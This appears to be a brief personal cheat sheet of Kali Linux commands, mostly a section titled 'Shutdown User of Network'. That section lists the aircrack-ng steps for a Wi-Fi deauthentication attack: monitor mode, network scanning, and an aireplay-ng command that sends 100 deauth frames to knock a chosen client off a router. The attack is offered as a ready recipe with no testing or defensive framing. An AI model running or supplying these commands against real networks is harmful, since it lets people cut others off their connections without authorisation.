# kali-commands

---

**Others Commands:** 

setxkbmap -model abnt2 -layout br _This command set the layout keyboard for brazilian._
   
---

**Wireless**

***Shutdown User of Network***

   -``ifconfig`` - _for see name of the internet, like Ether or Wlan_   
   
   -`root@localhost:~# airmon-ng start wlan0 ` _This example init airmon for monitoring_
   
   -`root@localhost:~# airodump-ng wlan0mon` _this init the screen of networks_  
   
   `-root@localhost:~# airodump-ng --bssid 58:D5:6E:6C:2F:8C --channel 10 wlan0mon` _Here initialize process of see all users in network_
   
   -`root@localhost:~# aireplay-ng -0 100 -a 58:D5:6E:6C:2F:8C -c 48:49:C7:FD:F3:1E wlan0mon` _this init the attach._
   
   -`root@localhost:~# airmon-ng stop wlan0mon` _This stop monitoring mod_

refs: --bssid or -a is Mac Adress of Router and -c is Mac of device connected.

---

**Install packages**

(https://docs.kali.org/general-use/kali-linux-sources-list-repositories)

Two links for insert in /etc/apt/sources.list
ex: nano /etc/apt/sources.list
